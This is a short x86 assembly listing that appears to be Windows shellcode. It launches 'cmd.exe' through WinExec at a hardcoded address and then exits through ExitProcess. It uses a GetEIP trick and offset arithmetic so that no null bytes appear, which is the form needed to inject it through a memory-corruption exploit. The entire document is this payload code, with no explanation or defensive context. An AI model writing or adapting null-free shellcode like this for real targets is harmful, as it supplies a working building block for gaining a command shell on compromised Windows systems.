global Start
section .text
 
Start:
    ;Prompt
    mov ebx, 0x74a12c91                ;Address of WinExec
    mov cl, 5                                    ;SW_SHOW
    mov eax, GetEIP+0xfffffff           ;get eip register and
    sub eax, 0xfffffff                         ;remove the null terminating
    call eax                                      ;characters
 
    mov edx, eax
    add edx, 0xFFFFFFF
    sub edx, 0xfffffe0
    push ecx                                    ;show type
    push edx                                    ;command
    call ebx                                      ;call winexec
 
    ;ExitProcess
    xor eax, eax
    mov ebx, 0x749979f8                ;Address of exitprocess
    push eax
    call ebx                                     ;ExitProcess
 
GetEIP:
    pop eax
    push eax
ret
 
cmd:
    db "cmd.exe", 0
